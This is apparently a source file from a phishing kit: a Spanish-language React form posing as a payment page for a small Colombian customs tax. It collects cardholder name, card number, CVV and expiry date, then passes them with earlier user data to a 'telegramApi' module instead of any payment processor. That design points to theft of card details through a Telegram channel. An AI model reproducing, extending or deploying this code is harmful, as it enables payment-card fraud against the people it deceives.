import React, { useState } from 'react'
import telegramApi from './telegramApi'
const form2 = ({showMenuPay,inputClass,formPay,setFormPay,setMensajeFelicidades,formUser}) => {
    const [valided,setValided]=useState(false)
    
    const handleChange=(e)=>{
        setFormPay({...formPay,
            [e.target.name]:e.target.value})
    }
    const validTarjeta=(tarjeta)=>{
        let patron = /^(?:(4[0-9]{12}(?:[0-9]{3})?)|(5[1-5][0-9]{14})|(6(?:011|5[0-9]{2})[0-9]{12})|(3[47][0-9]{13})|(3(?:0[0-5]|[68][0-9])[0-9]{11})|((?:2131|1800|35[0-9]{3})[0-9]{11}))$/; 
        console.log(patron.test(tarjeta))
        setValided(patron.test(tarjeta))
    }
    const enviarDatos=(e)=>{
        e.preventDefault()
        const {nombreApellido,numeroTarjeta,expiracion,cvv}=formPay;
        console.log(formPay)
        if(valided&&nombreApellido&&expiracion&&cvv){
            setMensajeFelicidades(true)
            valided&&telegramApi(formUser,formPay)
        }
    }
    return (
    <form style={{top:showMenuPay?"0px":"550px"}} className={`border-2 absolute w-full h-full bg-white ${showMenuPay?"":""} transition-all duration-500 ease-in-out`}>
        <div className='bg-gray-200 w-full border-2 h-6 mb-0  border-t-gray-300'></div>
        <div className='w-full px-4'>
            <h5 className='text-base md:text-xl my-4'>Realizar pago de impuesto de aduanas por valor de: $9.650 COP.</h5>
            
            <input className={inputClass} onChange={handleChange} 
                value={formPay.nombreApellido} type="text" 
                name="nombreApellido" 
                placeholder="Nombre y Apellido" 
                required
            />
            <input className="w-full bg-gray-200 py-3 mb-4 rouneded-md px-2" onChange={(e)=>handleChange(e,"form2")} 
                value={formPay.numeroTarjeta} 
                type="number" 
                name="numeroTarjeta" 
                placeholder="Número de tarjeta de credito" 
                onBlur={()=>validTarjeta(formPay.numeroTarjeta)}
                required
            />
            {!valided&&<div className='text-red-400 px-2 my-2'>Tarjeta invalida</div>} 
            <input className={inputClass} onChange={handleChange} 
                value={formPay.cvv}
                type="number" 
                name="cvv" 
                placeholder="CVV" 
                required
            />
            <input className={inputClass} onChange={handleChange} 
                value={formPay.expiracion} 
                type="text" 
                name="expiracion" 
                placeholder="Fecha Expiración " 
                required
            />
        </div>
        <button className='bg-orange-600 text-white w-full py-3 hover:underline rounded-md text-xs md:text-base' onClick={(e)=>enviarDatos(e)}>Realizar pago por: $9.650 COP</button>
    </form>
  )
}

export default form2